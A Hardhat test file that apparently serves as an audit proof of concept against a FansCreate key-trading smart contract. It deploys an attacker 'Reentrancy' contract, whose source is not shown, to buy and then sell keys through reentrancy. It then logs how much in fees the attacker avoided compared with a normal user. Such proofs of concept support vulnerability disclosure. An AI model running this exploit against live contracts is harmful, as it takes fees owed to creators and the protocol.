import { Signer } from "ethers";
import hre, { network } from "hardhat";
import { expect } from "chai";
import { loadFixture, time } from "@nomicfoundation/hardhat-toolbox/network-helpers";
import { deployFansCreate } from "../../lib/deploy";
import { signPublishFansCreate } from "../../lib/signature";
import { IERC1155InterfaceID, getInterfaceID } from "../../lib/utils";
import { IAccessControl__factory } from "../../typechain-types";

const URI = "https://api.xter.io/xgc/meta/works/{id}";
const WORK_ID = 123;
const WORK_ID2 = 456;
const PROJECT_ID = 666;
describe("Test FansCreate Contract", function () {
  async function basicFixture() {
    const [admin, signer, p1, c1, c2, u1, u2, u3,u4] = await hre.ethers.getSigners();
    const fansCreate = await deployFansCreate(admin.address, signer.address, admin.address, URI);
    return {
      fansCreate,
      admin,
      signer,
      p1,
      c1,
      c2,
      u1,
      u2,
      u3,
      u4
    };
  }

  async function publishedWorkFixture() {
    const base = await loadFixture(basicFixture);
    const { fansCreate, signer, c1, p1 } = base;
    const deadline = (await time.latest()) + 600;
    const signature = await signPublishFansCreate(signer, c1.address, WORK_ID, PROJECT_ID, deadline, fansCreate.target);
    await fansCreate.setProjectFeeRecipient(PROJECT_ID, p1.address);
    await fansCreate
      .connect(c1)
      .publishAndBuyKeys(c1.address, WORK_ID, 1, PROJECT_ID, deadline, signer.address, signature);
    const signature2 = await signPublishFansCreate(signer, c1.address, WORK_ID2, 0, deadline, fansCreate.target);
    await fansCreate.connect(c1).publishAndBuyKeys(c1.address, WORK_ID2, 1, 0, deadline, signer.address, signature2);
    return base;
  }
  it.only("POC_walter", async function () {
    const { fansCreate,u4 } = await loadFixture(publishedWorkFixture);

    const WalterPOC = await hre.ethers.getContractFactory("Reentrancy");
    const reentrancy = await WalterPOC.deploy(WORK_ID,await fansCreate.getAddress(),{value: hre.ethers.parseEther("2")});

    await network.provider.send("hardhat_setBalance", [
      u4.address,
      "0x1BC16D674EC80000", // 2 ETH in hexadecimal (2e18)
    ]);

    // all 2 accounts start with 2 ETH each
    const balanceAttackerBefore = await hre.ethers.provider.getBalance(await reentrancy.getAddress());
    const balanceNormalUserBefore = await hre.ethers.provider.getBalance(u4.address);
    expect(balanceAttackerBefore).to.equal(balanceNormalUserBefore); //quick check that start with the same balance(2 ETH)

    const priceInfo2buy = await fansCreate.getBuyPrice(WORK_ID2, 101);
    const priceInfo1buy = await fansCreate.getBuyPrice(WORK_ID, 101);
    expect(priceInfo2buy.priceAfterFee).to.equal(priceInfo1buy.priceAfterFee); // same price

    // make user buy
    await fansCreate.connect(u4).buyKeys(await u4.getAddress(), WORK_ID2, 101, priceInfo2buy.priceAfterFee, {value: priceInfo2buy.priceAfterFee});

    // make attacker buy
    await reentrancy.buySome(101);

    // attacker sell all
    await reentrancy.skipFeesOnFansCreate();

    //user sell all
    const priceInfo2 = await fansCreate.getSellPrice(WORK_ID2, 101);
    await fansCreate.connect(u4).sellKeys(WORK_ID2, 101, priceInfo2.priceAfterFee);

    const balanceUser = await hre.ethers.provider.getBalance(u4.address);
    const balanceWithHack = await hre.ethers.provider.getBalance(await reentrancy.getAddress());
    console.log("the attacker has not paid: " + (balanceWithHack-balanceUser).toString() )

  });
});
